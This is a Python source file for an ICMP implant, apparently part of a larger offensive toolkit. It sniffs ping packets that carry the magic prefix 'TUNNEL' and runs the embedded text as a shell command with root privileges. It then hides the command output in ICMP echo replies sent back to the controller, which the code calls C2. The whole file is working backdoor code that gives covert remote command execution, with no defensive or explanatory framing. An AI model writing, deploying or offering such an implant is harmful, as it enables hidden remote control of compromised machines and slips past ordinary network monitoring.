#!/usr/bin/env python3
import logging
import subprocess
import os
import sys
from scapy.all import IP, ICMP, Raw, send, sniff

# Add the project root to the Python path for module access
def find_project_root(start_path):
    current_path = os.path.abspath(start_path)
    while True:
        if os.path.exists(os.path.join(current_path, 'main.py')):
            return current_path
        parent_path = os.path.dirname(current_path)
        if parent_path == current_path:
            return None
        current_path = parent_path

project_root = find_project_root(os.path.dirname(__file__))
if project_root:
    sys.path.append(project_root)
else:
    # If running standalone, the module might not be found.
    # We define a fallback execution function.
    def execute_implant_command(command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return str(e)
    ICMP_MAGIC_VALUE = b'TUNNEL'

if project_root:
    from modules.icmp_tunnel import execute_implant_command, ICMP_MAGIC_VALUE

def implant_listener():
    """
    The main listener loop for the implant.
    Sniffs for ICMP commands, executes them, and sends back the output.
    """
    logging.info("ICMP implant listener started.")

    def packet_handler(packet):
        if packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw): # ICMP Echo Request
            payload = packet[Raw].load
            if payload.startswith(ICMP_MAGIC_VALUE):
                command = payload[len(ICMP_MAGIC_VALUE):].decode(errors='ignore')
                logging.info(f"Received command from {packet[IP].src}: {command}")

                output = execute_implant_command(command)

                response_payload = ICMP_MAGIC_VALUE + output.encode(errors='ignore')
                response_packet = IP(dst=packet[IP].src) / ICMP(type=0) / Raw(load=response_payload) # ICMP Echo Reply
                send(response_packet, verbose=False)
                logging.info("Sent command output back to C2.")

    try:
        sniff(filter="icmp", prn=packet_handler, store=0)
    except PermissionError:
        logging.error("Permission denied. This operation requires root privileges.")
        sys.exit(1)
    except Exception as e:
        logging.error(f"An error occurred in the implant listener: {e}")

def main():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    print("Starting ICMP implant...")
    implant_listener()

if __name__ == "__main__":
    # Check for root privileges
    if os.geteuid() != 0:
        print("This implant requires root privileges to run.", file=sys.stderr)
        sys.exit(1)
    main()
